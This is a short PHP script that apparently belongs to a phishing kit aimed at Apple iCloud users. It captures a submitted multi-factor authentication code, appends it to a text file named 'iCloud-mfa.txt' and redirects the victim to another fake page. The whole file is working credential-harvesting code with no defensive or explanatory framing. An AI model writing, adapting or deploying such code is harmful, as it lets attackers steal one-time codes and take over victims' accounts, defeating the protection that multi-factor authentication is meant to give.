<?php

file_put_contents("iCloud-mfa.txt", "MFA Code: " . $_POST['code'] . "\n", FILE_APPEND);

header('Location: mfa.html');

// Ensures that no further code is executed
exit();
?>